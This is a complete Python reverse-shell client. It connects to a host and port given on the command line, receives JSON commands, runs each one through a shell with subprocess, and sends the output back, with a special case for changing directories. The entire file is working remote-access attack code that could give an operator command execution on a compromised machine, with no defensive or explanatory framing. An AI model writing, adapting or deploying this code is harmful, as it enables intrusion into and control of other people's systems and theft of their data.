#!/usr/bin/python

import os
import sys
import json
import socket
import subprocess
from time import sleep
from termcolor import colored


def s_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode("utf-8"))

def s_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode("utf-8")
            return json.loads(data)
        except ValueError:
            continue
        except ConnectionResetError:
            sys.exit()

def shell():
    while True:
        command = s_recv()
        if command == "q":
            break
        elif command[:2] =="cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            result = proc.stdout.read() + proc.stderr.read()
            s_send(result.decode("utf-8"))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))


shell()
sock.close()
print(colored("Closing connection !!!", "red"))